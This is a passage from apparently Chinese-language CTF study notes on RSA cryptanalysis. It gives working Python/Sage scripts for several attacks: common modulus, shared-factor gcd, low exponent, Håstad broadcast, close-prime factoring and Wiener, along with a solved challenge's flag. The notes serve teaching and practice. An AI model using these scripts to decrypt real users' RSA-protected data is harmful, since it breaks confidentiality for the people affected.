class="number">27158</span>*x^<span class="number">59</span> + <span class="number">918</span>*x^<span class="number">58</span> + <span class="number">38601</span>*x^<span class="number">57</span> + <span class="number">4269</span>*x^<span class="number">56</span> + <span class="number">5699</span>*x^<span class="number">55</span> + <span class="number">36444</span>*x^<span class="number">54</span> + <span class="number">34791</span>*x^<span class="number">53</span> + <span class="number">37978</span>*x^<span class="number">52</span> + <span class="number">32481</span>*x^<span class="number">51</span> + <span class="number">8039</span>*x^<span class="number">50</span> + <span class="number">11012</span>*x^<span class="number">49</span> + <span class="number">11454</span>*x^<span class="number">48</span> + <span class="number">30450</span>*x^<span class="number">47</span> + <span class="number">1381</span>*x^<span class="number">46</span> + <span class="number">32403</span>*x^<span class="number">45</span> + <span class="number">8202</span>*x^<span class="number">44</span> + <span class="number">8404</span>*x^<span class="number">43</span> + <span class="number">37648</span>*x^<span class="number">42</span> + <span class="number">43696</span>*x^<span class="number">41</span> + <span class="number">34237</span>*x^<span class="number">40</span> + <span class="number">36490</span>*x^<span class="number">39</span> + <span class="number">41423</span>*x^<span class="number">38</span> + <span class="number">35792</span>*x^<span class="number">37</span> + <span class="number">36950</span>*x^<span class="number">36</span> + <span class="number">31086</span>*x^<span class="number">35</span> + <span class="number">38970</span>*x^<span class="number">34</span> + <span class="number">12439</span>*x^<span class="number">33</span> + <span class="number">7963</span>*x^<span class="number">32</span> + <span class="number">16150</span>*x^<span class="number">31</span> + <span class="number">11382</span>*x^<span class="number">30</span> + <span class="number">3038</span>*x^<span class="number">29</span> + <span class="number">20157</span>*x^<span class="number">28</span> + <span class="number">23531</span>*x^<span class="number">27</span> + <span class="number">32866</span>*x^<span class="number">26</span> + <span class="number">5428</span>*x^<span class="number">25</span> + <span class="number">21132</span>*x^<span class="number">24</span> + <span class="number">13443</span>*x^<span class="number">23</span> + <span class="number">28909</span>*x^<span class="number">22</span> + <span class="number">42716</span>*x^<span class="number">21</span> + <span class="number">6567</span>*x^<span class="number">20</span> + <span class="number">24744</span>*x^<span class="number">19</span> + <span class="number">8727</span>*x^<span class="number">18</span> + <span class="number">14895</span>*x^<span class="number">17</span> + <span class="number">28172</span>*x^<span class="number">16</span> + <span class="number">30903</span>*x^<span class="number">15</span> + <span class="number">26608</span>*x^<span class="number">14</span> + <span class="number">27314</span>*x^<span class="number">13</span> + <span class="number">42224</span>*x^<span class="number">12</span> + <span class="number">42551</span>*x^<span class="number">11</span> + <span class="number">37726</span>*x^<span class="number">10</span> + <span class="number">11203</span>*x^<span class="number">9</span> + <span class="number">36816</span>*x^<span class="number">8</span> + <span class="number">5537</span>*x^<span class="number">7</span> + <span class="number">20301</span>*x^<span class="number">6</span> + <span class="number">17591</span>*x^<span class="number">5</span> + <span class="number">41279</span>*x^<span class="number">4</span> + <span class="number">7999</span>*x^<span class="number">3</span> + <span class="number">33753</span>*x^<span class="number">2</span> + <span class="number">34551</span>*x + <span class="number">9659</span></span><br></pre></td></tr></table></figure>
<h3 id="解密-1">解密</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PHI = (p ** P.degree() - <span class="number">1</span>) * (p ** Q.degree() - <span class="number">1</span>)</span><br><span class="line">D = inverse_mod(e, PHI)</span><br><span class="line">m = c ** D</span><br><span class="line">flag = <span class="built_in">bytes</span>(m.<span class="built_in">list</span>())</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;watevr&#123;RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p>其中需要注意的是，对于多项式来说，<span class="math inline">\(\varphi(N)\)</span> 应该是与 <span class="math inline">\(N\)</span>
没有公共多项式的且不高于其幂级的多项式的个数，即 <span class="math display">\[
\varphi(N)=(pow(43753,65)-1)*(pow(43753,112)-1)
\]</span></p>
<h1 id="rsa-攻击">RSA 攻击</h1>
<h2 id="分解模数n">分解模数N</h2>
<ol type="1">
<li><p>(推荐) 使用在线网站 http://www.factordb.com/index.php
查询素数分解</p></li>
<li><p>使用 yafu 工具本地分解质因数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; ./yafu64.exe</span><br><span class="line"><span class="built_in">factor</span>(911934970359)</span><br></pre></td></tr></table></figure>
<p>回显为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fac: factoring 911934970359</span><br><span class="line">fac: using pretesting plan: normal</span><br><span class="line">fac: no tune info: using qs/gnfs crossover of 95 digits</span><br><span class="line">div: primes less than 10000</span><br><span class="line"><span class="built_in">fmt</span>: 1000000 iterations</span><br><span class="line">Total factoring time = 0.0080 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***factors found***</span><br><span class="line"></span><br><span class="line">P1 = 3</span><br><span class="line">P1 = 7</span><br><span class="line">P2 = 97</span><br><span class="line">P9 = 447685307</span><br><span class="line"></span><br><span class="line">ans = 1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="邻近因数-pq-分解">邻近因数 <span class="math inline">\((p,q)\)</span> 分解</h2>
<h3 id="特征">特征</h3>
<p><span class="math inline">\((p,q)\)</span> 是邻近的大素数</p>
<h3 id="脚本">脚本</h3>
<p>也可以使用 yafu 进行分解，这里给出 Sagemath 的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">177606504836499246970959030226871608885969321778211051080524634084516973331441644993898029573612290095853069264036530459253652875586267946877831055147546910227100566496658148381834683037366134553848011903251252726474047661274223137727688689535823533046778793131902143444408735610821167838717488859902242863683</span></span><br><span class="line">c=<span class="number">1457390378511382354771000540945361168984775052693073641682375071407490851289703070905749525830483035988737117653971428424612332020925926617395558868160380601912498299922825914229510166957910451841730028919883807634489834128830801407228447221775264711349928156290102782374379406719292116047581560530382210049</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">pp = isqrt(n)</span><br><span class="line">qq = pp</span><br><span class="line"><span class="keyword">while</span> pp * qq != n:</span><br><span class="line">    pp = next_prime(pp)</span><br><span class="line">    qq = n // pp</span><br><span class="line">p, q = pp, qq</span><br></pre></td></tr></table></figure>
<h2 id="共模数攻击">共模数攻击</h2>
<h3 id="特征-1">特征</h3>
<p>若干次加密，e不同，N相同，m相同。</p>
<h3 id="原理">原理</h3>
<p>由于使用公钥对 <span class="math inline">\((N,e_1)\)</span>与<span class="math inline">\((N,e_2)\)</span> 加密明文<span class="math inline">\(m\)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m, e1, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, N)</span><br></pre></td></tr></table></figure>
<p>故使用私钥对 <span class="math inline">\((N,d_1)\)</span>与<span class="math inline">\((N,d_2)\)</span> 可以得到相同明文<span class="math inline">\(m\)</span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = pow(c1, d1, N)</span><br><span class="line">m = pow(c2, d2, N)</span><br></pre></td></tr></table></figure>
<p>这时我们只需已知<span class="math inline">\(c_1,c_2,e_1,e_2,N\)</span>则可以绕过<span class="math inline">\(d_1,d_2\)</span>直接恢复明文<span class="math inline">\(m\)</span></p>
<p>信息安全数学基础证明如下：</p>
<p>假设公钥共模且互素，则有 <span class="math display">\[
\gcd(e_1,e_2)=1
\]</span> 即 <span class="math display">\[
e_1x+e_2y=1
\]</span> 其中<span class="math inline">\(x,y\)</span>皆为整数，一正一负。</p>
<p>利用扩展欧几里得算法可以求得解<span class="math inline">\((x,y)\)</span>，在这里不妨设<span class="math inline">\(x\)</span>为正，<span class="math inline">\(y\)</span>为负，利用模运算性质得 <span class="math display">\[
c_1^xc_2^y(mod\ n)=m^{e_1x}m^{e_2y}=m^{e_1x+e_2y}=m\pmod{n}
\]</span></p>
<p>特别地，当 <span class="math inline">\(\gcd(e_1,e_2)=g\)</span>
较小时，也可以构造为： <span class="math display">\[
c_1^xc_2^y(mod\ n)=m^{e_1x}m^{e_2y}=m^{e_1x+e_2y}=m^g\pmod{n}
\]</span> 随后进行低加密指数攻击。</p>
<h3 id="实现">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext</span><br><span class="line">n = <span class="number">0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875</span></span><br><span class="line">e1 = <span class="number">0x3045</span></span><br><span class="line">e2 = <span class="number">0xff4d</span></span><br><span class="line">c1 = <span class="number">0x5d1e39bc751108ec0a1397d79e63c013d238915d13380ae649e84d7d85ebcffbbc35ebb18d2218ccbc5409290dfa8a4847e5923c3420e83b1a9d7aa67190dc0d34711cce261665c64c28ed2834394d4b181926febf7eb685f9ce81f36c7fb72798da3a14a123287171d26e084948aab0fba81c53f10b5696fc291006254ee690</span></span><br><span class="line">c2 = <span class="number">0x3d90f2bec4fe02d8ce4cece3ddb6baed99337f7e6856eef255445741b5cfe378390f058679d70236e51be4746db4c207f274c40b092e24f8c155a0957867e84dca48e27980af488d2615a280c6eadec2f1d30b95653b1ee3135e2edff100dd2c529994f846722f811348b082d0bec7cfab579a4bd0ab789928b1bebed68d628f</span></span><br><span class="line">g, r, s = gcdext(e1, e2)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, r, n) * <span class="built_in">pow</span>(c2, s, n) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
<h2 id="公约数攻击">公约数攻击</h2>
<h3 id="特征-2">特征</h3>
<p>多个n，均不相同，并且都是2048bit，4096bit级别，并且明文都没什么联系。</p>
<h3 id="原理-1">原理</h3>
<p>使用公约数求出共同的素数因子</p>
<h3 id="实现-1">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = <span class="number">9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327</span></span><br><span class="line">n2 = <span class="number">13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span></span><br><span class="line">p = gmpy2.gcd(n1, n2)</span><br><span class="line">q1 = n1 / p</span><br><span class="line">q2 = n2 / p</span><br></pre></td></tr></table></figure>
<h2 id="n-与-varphin-分解"><span class="math inline">\(N\)</span> 与
<span class="math inline">\(\varphi(N)\)</span> 分解</h2>
<h3 id="原理-2">原理</h3>
<p>我们已知 <span class="math display">\[
N=pq\\
\varphi(N)=(p-1)(q-1)=pq-(p+q)+1=N-(p+q)+1
\]</span> 我们不妨构建一个二次方程，这个二次方程的两根之和为 <span class="math inline">\(x_1+x_2=p+q\)</span>，两根之积为 <span class="math inline">\(x_1x_2=pq\)</span>，即方程： <span class="math display">\[
x^2+(\varphi(N)-N-1)x+N=0
\]</span> 该方程的解即为 <span class="math inline">\((p,q)\)</span></p>
<p>特别地，如果给予的是 <span class="math inline">\(N\)</span> 与 <span class="math inline">\(k\varphi(N)\)</span>，也有可能是 <span class="math inline">\(k\varphi(N)=ed\)</span></p>
<p>我们可以计算出 <span class="math display">\[
k=\frac{k\varphi(N)}{N}+1=k-\left \lceil \frac{p+q+1}{N} \right \rceil
+1
\]</span> 其中一定存在 <span class="math display">\[
\left \lceil \frac{p+q+1}{N} \right \rceil=1
\]</span> 所以 <span class="math inline">\(k\)</span> 一定就在 <span class="math inline">\(\displaystyle\frac{k\varphi(N)}{N}\)</span>
附近。</p>
<blockquote>
<p>当 <span class="math inline">\(N\)</span> 位数足够大时，<span class="math inline">\(k=\frac{k\varphi(N)}{N}+1\)</span> 是一定的。</p>
</blockquote>
<h2 id="低加密指数攻击">低加密指数攻击</h2>
<h3 id="特征-3">特征</h3>
<p><span class="math inline">\(e\)</span>和<span class="math inline">\(m\)</span>都特小，例如<span class="math inline">\(e=3\)</span></p>
<h3 id="原理-3">原理</h3>
<p>在 RSA 中 e 也称为加密指数。</p>
<p>由于 e 是可以随意选取的，选取小一点的 e
可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p>
<p>若<span class="math inline">\(m^3&lt;n\)</span>，即<span class="math inline">\(c=m^3\)</span></p>
<p>若<span class="math inline">\(m^3&gt;n\)</span>但并非<span class="math inline">\(m^3\gg n\)</span>，即<span class="math inline">\(c=(m^3+i*n)\ mod\ n\)</span>，其中<span class="math inline">\(i\)</span>是我们需要爆破的系数</p>
<h3 id="实现-2">实现</h3>
<ul>
<li><p>若<span class="math inline">\(m^3&lt;n\)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n= <span class="number">22885480907469109159947272333565375109310485067211461543881386718201442106967914852474989176175269612229966461160065872310916096148216253429849921988412342732706875998100337754561586600637594798877898552625378551427864501926224989873772743227733285336042475675299391051376624685754547818835551263597996620383338263448888107691240136257201191331617560711786674975909597833383395574686942099700631002290836152972352041024137872983284691831292216787307841877839674258086005814225532597955826353796634417780156185485054141684249037538570742860026295194559710972266059844824388916869414355952432189722465103299013237588737</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c= <span class="number">15685364647213619014219110070569189770745535885901269792039052046431067708991036961644224230125219358149236447900927116989931929305133870392430610563331490276096858863490412102016758082433435355613099047001069687409209484751075897343335693872741</span></span><br><span class="line">m, flag = gmpy2.iroot(c, e)</span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;m=<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;could not decode m&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>若<span class="math inline">\(m^3&gt;n\)</span>但并非<span class="math inline">\(m^3\gg n\)</span> (这里需要跑比较久)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">114976915747243387792157708464120735018971336213935438953074748276198282761939060395482051056351068439137722626185590043024556656813730840050547350912425438364703854627760482842307943026011880815011654341047422453012558617703411700393668892701036222135444420377515575624398723436532681305293727164639582093389</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">5828813410620741112500628876643872258919868379601617907887884191584237969605489971465692568848339200057188383649365078832766143513766368216471491824042974016773526107276856706832404477882581400769791378958901067683158857990261489285951805740071223765359992165262854641069674603160977034446644199945940251030</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    m, flag = gmpy2.iroot(c + i * n, e)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;m=<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="e1-攻击"><span class="math inline">\(e=1\)</span> 攻击</h2>
<h3 id="实现-3">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcd</span></span><br><span class="line">e = <span class="number">0x1</span></span><br><span class="line">c = <span class="number">0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797d</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="comment"># i 可以取很多</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">10</span>:</span><br><span class="line">    m = c + i * n</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="低加密指数广播攻击">低加密指数广播攻击</h2>
<h3 id="特征-4">特征</h3>
<p>三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。</p>
<h3 id="原理-4">原理</h3>
<p>如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。</p>
<p>例如当<span class="math inline">\(e=3\)</span>时，有以下等式成立：
<span class="math display">\[
c_1=pow(m,e,n_1)\\
c_2=pow(m,e,n_2)\\
c_3=pow(m,e,n_3)\\
\cdots
\]</span> 对上列等式运用中国剩余定理，得到 <span class="math display">\[
c_x=pow(m,e,n_1*n_2*n_3*\cdots)
\]</span></p>
<p>随后再进行低加密指数攻击。</p>
<h3 id="实现-4">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">clist, nlist</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, nlist)</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c, n <span class="keyword">in</span> <span class="built_in">zip</span>(clist, nlist):</span><br><span class="line">        m = N // n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>: <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += c * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line">e = <span class="number">9</span></span><br><span class="line">n = [<span class="number">142782424368849674771976671955176187834932417027468006479038058385550042422280158726561712259205616626939123504489410624745195777853423961104590708231562726165590769610040722589287393102301338152085670464005026301781192671834390892019478189768725018303217559795377795540494239283891894830166363576205812991157</span>, <span class="number">153610425077816156109768509904751446801233412970601397035720458311275245730833227428213917577405780162151444202393431444812010569489900435979730559895340377469612234558042643742219128033827948585534761030527275423811282367831985007507137144308704413007806012914286105842311420933479771294576841956749281552971</span>, <span class="number">152540067782701001222493009941492423063369171831039847414320547494725020441901272486665728360741395415762864872737675660423920609681185809510355937534756399208661762715484879562585724584849261266873624875852300611683382543315580370484972470694466195837255994159609193239840228218925381488410059939975556977947</span>, <span class="number">125842716702134814646356078531900645012495638692517778270527426844383063904041812273637776798591687732598509470005151551320457132061693618473039437320011446697406190781306264437609046721508738109650829547010385875425097336266103994639126319889016342284747700714199556143378526590058467791687837422897022829661</span>, <span class="number">116144389285266462769913139639175922392318396923181100785008570884082681963637784423143843845816350379438789947802939701820129805341796427821894273985551331666719808355412080909245720551238149511778060242720419584504473490216670437024863860559347959698828131475160058721701582089480924088773887932997353631767</span>, <span class="number">127833907448946785858374094953899556339175475846831397383049660262333005992005484987913355932559627279178940862787593749842796469355336182379062826441222705075178971785791223706944120681105575965622931327112817747065200324610697178273898956820957640413744954233327851461318200323486469677469950386824833536523</span>, <span class="number">130561613227079478921314550968562766645507834694262831586725464124109153306162445639759476845681271537955934718244296904503168256991962908095007040044300188572466395275317838178325500238288302672390013747102961340256309124310478931896245221622317302428447389760864327859640573452084295225059466376349115703119</span>, <span class="number">115953389401040751013569404909249958538962411171147823610874077094621794755967854844224923689925397631692572916641171075740839099217316101334941033937183815345038898177087515909675028366437302462022970987947264115373697445950951595479758872029099661065186221250394358255523574834723958546450323357472451930993</span>, <span class="number">143437107845384843564651522639125300763388830136500260725097766445883003928355325003575359566631064630487365774344508496878731109174874449170057678821440711511966073934025028100604234445470976333825866939923998344367645612128590820812489407412175198698290167077116185959180877334222693344630253253476594907313</span>]</span><br><span class="line">c = [<span class="number">85033868418784308573673709960700777350314426427677627319697346811123742342359072170220428874952996988431950989321281905284522596263957356289624365171732095210045916218066135140320107686084053271623461104022705353814233772164502775939590711842361956121603943483040254727995655776263673058788416722141673409688</span>, <span class="number">66065963470666895005407449599703926269325406456711861190876894466341571726360462706664546294453572319565476664348345756905411939632955966517708138047546806602828064213238537646393524578984547577761559965654539771172357089802682793169968961304179886652390277814477825753096636750388350662980872556701402397564</span>, <span class="number">116011740820520887443111656288411611070614127688662643257265381793048354928820176624229624692124188995846076431510548507016903260774215950803926107831505634778278712070141663189086436127990584944132764896694777031370995058271038329228336417590284517922855284619653301817355115583540545182119702335431334401666</span>, <span class="number">97640420284096094887471273365295984332267897927392169402918423863919914002451127544715668846623138003564829254309568918651163254043205129883843425179687841236818720463784828905460885026290909768599562386370732119591181513319548915478512030197629196018254041500662654260834562708620760373487652389789200792120</span>, <span class="number">8112507653841374573057048967617108909055624101437903775740427861003476480616929517639719198652146909660899632120639789106782550275648578142883715280547602249589837441805676364041484345030575130408744621981440093280624046635769338568542048839419939250444929802135605724150484414516536378791500915047844188300</span>, <span class="number">36792148360808115566234645242678223867680969786675055638670907933041180936164293809961667801099516457636164692292891528415720085345494773373966277807505798679784807614784581861287048096977968620964436947452527540958289441390882589051225367658014709290392321808926567572528170531844664734909469690750971883323</span>, <span class="number">53043093283305492238903255767698153246673671181809989362223466090875767705978690531154079519999671834688647277179370374802495005937892824566602423646978168777735383632928274082669949750078161820002768640908750005814934158829006019656592134357897586040866207754535586785064545866404380204728594863102313407789</span>, <span class="number">88499407133762624445946519155722583633934260410706930537441122463087556094734626189377091740335667052378955691250910459790202385799502439716173363179773811920751410726795431402796346647688144853156900427797933862087074385441977254140336390678022955770879265490567987868532251217565094093318626424653599450992</span>, <span class="number">138337520305048557335599940473834485492131424901034295018189264168040969172072024612859307499682986987325414798210700710891033749119834960687318156171051379643844580970963540418974136891389303624057726575516576726845229494107327508855516437230240365759885913142671816868762838801720492804671259709458388192984</span>]</span><br><span class="line">x, n = CRT(c, n)</span><br><span class="line">m, flag = gmpy2.iroot(x, e)</span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;m=<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;could not decode m&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="低解密指数攻击-wiener-attack">低解密指数攻击 (Wiener
Attack)</h2>
<h3 id="特征-5">特征</h3>
<p><span class="math inline">\(e\)</span>特别大</p>
<h3 id="原理-5">原理</h3>
<p>与低加密指数相同，低解密指数可以加快解密的过程，但是也带来了安全问题。种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害
RSA 的安全。此时需要满足：<span class="math inline">\(q&lt;p&lt;2q\)</span>。如果满足上述条件，通过
Wiener Attack (维纳攻击) 可以在多项式时间中分解N。</p>
<h3 id="实现-5">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">x, y</span>):  <span class="comment"># 使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x//y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">sub_res</span>):</span><br><span class="line">    numerator, denominator = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># 从sublist的后面往前循环</span></span><br><span class="line">        denominator, numerator = numerator, i*numerator+denominator</span><br><span class="line">    <span class="keyword">return</span> denominator, numerator  <span class="comment"># 得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解每个渐进分数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_fraction</span>(<span class="params">x, y</span>):</span><br><span class="line">    res = transform(x, y)</span><br><span class="line">    <span class="comment"># 将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(continued_fraction, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a, b, c</span>):  <span class="comment"># 由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par = gmpy2.isqrt(b*b-<span class="number">4</span>*a*c)  <span class="comment"># 由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1, x2 = (-b+par)//(<span class="number">2</span>*a), (-b-par)//(<span class="number">2</span>*a)</span><br><span class="line">    <span class="keyword">return</span> x1, x2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> sub_fraction(e, n):  <span class="comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># 可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d-<span class="number">1</span>) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        phi = (e*d-<span class="number">1</span>)//k  <span class="comment"># 这个结果就是 φ(n)</span></span><br><span class="line">        px, qy = get_pq(<span class="number">1</span>, n-phi+<span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> px*qy == n:</span><br><span class="line">            p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(<span class="built_in">int</span>(qy))  <span class="comment"># 可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            <span class="comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;该方法不适用&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759</span></span><br><span class="line">e = <span 